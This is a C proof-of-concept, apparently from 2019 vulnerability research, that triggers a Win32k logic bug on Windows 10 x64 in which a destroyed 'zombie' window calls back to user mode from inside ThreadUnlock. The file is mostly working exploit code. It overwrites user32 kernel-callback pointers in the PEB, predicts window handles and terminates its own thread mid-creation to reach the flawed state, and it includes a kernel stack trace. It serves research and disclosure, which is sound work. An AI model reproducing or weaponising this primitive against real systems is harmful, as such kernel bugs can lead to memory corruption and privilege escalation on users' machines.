//
// Gil Dabah 2019
//
// Win32k Smash the Ref - POC #4 - Ultimate Reloading - logical bug - exit to user-mode from zombie's xxxFreeWindow
// Windows 10 x64
//

/*
There are multiple steps taking place to reach to such a situation.
Step #1 - a. We create a window normally, making sure the WNDCLASS has extrabytes set.
		  b. We set up CBT hook, to catch that same window creation.
		  c. We hook client-alloc and client-free stubs so xxxCreateWindowEx passes
			 control to us when calling back to user-mode.

Step #2 - The client-allocation stub is called from xxxCreateWindowEx.
		  a. This is where we destroy the window to make it a zombie,
			 knowing that it still has a temporary lock by xxxCreateWindowEx itself.
		  b. Notice that we start a new thread and wait for it.

Step #3 - [Thread 2] Inside the new thread proc, we just look for some function that
		  will lock the window temporarily and callback to user-mode.
		  So we use sys commands for that. Just because they lock our HWND
		  and have hooks inside, could be many other things.

Step #4 - [Thread 2] We're inside a callback to user-mode from our second thread,
		  meaning that our window is held and we can continue execution from main thread.

Step #5 - We can now destroy the windwo to zombify it and get back to xxxCreateWindowEx
		  from step #1.

Step #6 - xxxCreateWindowEx calls back to our CBT hook proc in user-mode.
		  This is the elated trick of this scheme, we now terminate our own thread.
		  This causes skipping the part where xxxCreateWindowEx sees it's creating a bad
		  (destroyed) window and trying to free it for good under us.
		  But this window has locks from thread 2 by now.
		  Thread termination stops execution of xxxCreateWindowEx,
		  and thread destruction function ignores our window, because it's already destroyed.
		  Meaning eventually that our window is a zombie, that has a user-mode pointer that it
		  needs to free.

Step #7 - [Thread 2] Finally, our CBT hook proc on the second thread is done.
		  The last reference on the zombie via a temporary lock is now unlocking.
		  And calling back to user-mode to our stub in the middle of ThreadUnlock!

A zombie window should never callback to user-mode from its last reference inside ThreadUnlock!
And yet, look at the following stack trace:
00  win32kfull!xxxClientFreeWindowClassExtraBytes+0x8c
01  win32kfull!xxxFreeWindow+0x22a
02  win32kfull!xxxDestroyWindow+0x377
03  win32kbase!xxxDestroyWindowIfSupported+0x25
04  win32kbase!HMDestroyUnlockedObject+0x69
05  win32kbase!ThreadUnlock1+0x95
06  win32kfull!NtUserMessageCall+0x111
*/

#include <windows.h>
#include <stdio.h>

HWND g_hWnd = NULL;
int thread2Ready = 0;

#define ClientAllocExtraBytes_NO 0x7b
#define ClientFreeExtraBytes_NO 0x7c

typedef NTSTATUS(*faeb_ptr)(ULONG_PTR);
faeb_ptr g_faeb = NULL;
typedef NTSTATUS(*ffeb_ptr)(ULONG_PTR);
ffeb_ptr g_ffeb = NULL;

ULONG_PTR getPEB()
{
	return (ULONG_PTR)__readgsqword(0x60);
}

ULONG_PTR* getUser32Callbacks()
{
	return *(ULONG_PTR**)((char*)getPEB() + 0x58);
}

LRESULT CALLBACK hookProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HCBT_SYSCOMMAND)
	{
		if (wParam == SC_SCREENSAVE) // Verify it's our command.
		{
			printf("Step #4\n");
			printf("Lock holding window\n");
			// Signal main thread we're ready.
			thread2Ready = 1;
			// Wait for main thread to die.
			// Could use WaitForSingleObject, etc...
			Sleep(2000);

			DebugBreak();
		}
	}

	return 0;
}

DWORD CALLBACK threadProc(LPVOID)
{
	printf("Step #3\n");

	HHOOK hk = SetWindowsHookEx(WH_CBT, hookProc, NULL, GetCurrentThreadId());
	// Enter syscommand handling in the kernel so it just calls a CBT hook.
	// What we really care about is the callback to user-mode to hold a reference
	// on our soon-to-be zombie window.
	// SC_SCREENSAVER is just arbitrary and seems to not do much anyway.
	DefWindowProc(g_hWnd, WM_SYSCOMMAND, SC_SCREENSAVE, 0);
	UnhookWindowsHookEx(hk);

	return 0;
}

LRESULT CALLBACK cbtHookProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HCBT_CREATEWND)
	{
		static int once = 1;
		if (once)
		{
			once = 0;
			printf("Step #6\n");
			printf("CBT hook\n");
			if (g_hWnd == (HWND)wParam) // Just make sure it's our window.
			{
				// Stop dead right in the middle of xxxCreateWindow.
				// This will leave the window untampered, and the user-mode pointer to the
				// extra bytes is still loaded as is.
				ExitThread(0);
			}
		}
	}

	return 0;
}

LRESULT CALLBACK faeb(ULONG_PTR a)
{
	static int once = 1;

	if (once)
	{
		once = 0;
		printf("Step #2\n");
		printf("Client alloc extra bytes called\n");

		// Predict the HWND of our newly created window.
		// we know that a UI handle is divided to two parts, high word and low word.
		// The high word is the one that has the handle unique number,
		// and is bumped by one every time an object is freed.
		// So we use the last g_hWnd1 from the windows we created initially in main.
		// And add one for it to compensate on that last window destruction.
		WORD nextHandle = HIWORD(g_hWnd) + 1;
		// The low word is the index into the handle table, and stays the same.
		WORD indexHandle = LOWORD(g_hWnd);
		// And now we form a DWORD out of these two words, hopefully with the correct full HWND.
		g_hWnd = (HWND)((ULONG_PTR)indexHandle | ((ULONG_PTR)nextHandle << 16));

		printf("Hook it: %d\n", IsWindow(g_hWnd));

		// Create a second thread that will hold a reference on this window, before it becomes a zombie.
		CreateThread(NULL, 0, threadProc, NULL, 0, NULL);
		while (!thread2Ready) Sleep(10);

		printf("Done hooking\n");

		printf("Step #5\n");

		// Destroy the window to make it a zombie.
		DestroyWindow(g_hWnd);

		// This goes back to xxxCreateWindow to store the user-mode pointer we just give it.
	}

	return g_faeb(a);
}

LRESULT CALLBACK ffeb(ULONG_PTR a)
{
	static int once = 1;

	if (once)
	{
		once = 0;
		printf("Step #7\n");
		printf("Client free extra bytes called\n");
	}

	return g_ffeb(a);
}

void hookClientCallback(void** ptr, void* stub, DWORD fn)
{
	ULONG_PTR* ptrAddr = &getUser32Callbacks()[fn];
	*ptr = *(void**)ptrAddr;
	DWORD oldProt = 0;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), PAGE_READWRITE, &oldProt);
	*(ULONG_PTR*)ptrAddr = (ULONG_PTR)stub;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), oldProt, &oldProt);
}

int main()
{
	WNDCLASS wc = { 0 };
	wc.lpszClassName = "someclass";
	wc.lpfnWndProc = DefWindowProc;
	// This is crucial for xxxCreateWindowEx to do client-extra-bytes allocation/deallocation.
	wc.cbWndExtra = 100;
	RegisterClass(&wc);

	// We have a problem where the callback to client allocation stub doesn't supply
	// the HWND of the window we're creating.
	// And unfortunately, it's the first callback from window creation process,
	// meaning that no other mechanism like a CBT hook is helpful.
	// We need to allocate a few windows and destroy them, so the free list is bigger.
	// This raises the probability to predict the HWND from the client allocation stub.
	// Create a dummy window, to get the next HWND handle allocation.
	// Notice how we use the global HWND, so we can predict the HWND of the final window created
	// below in the client allocation stub based on this window we're destroying.
	for (int i = 0; i < 100; i++)
	{
		g_hWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
		DestroyWindow(g_hWnd);
	}

	printf("Step #1\n");

	hookClientCallback((void**)&g_faeb, (void*)faeb, ClientAllocExtraBytes_NO);
	hookClientCallback((void**)&g_ffeb, (void*)ffeb, ClientFreeExtraBytes_NO);

	// CBT is where we terminate our own thread.
	SetWindowsHookEx(WH_CBT, cbtHookProc, NULL, GetCurrentThreadId());
	// Remember that by the time CreateWindow returns, we're already done juggling with the window.
	CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

	return 0;
}
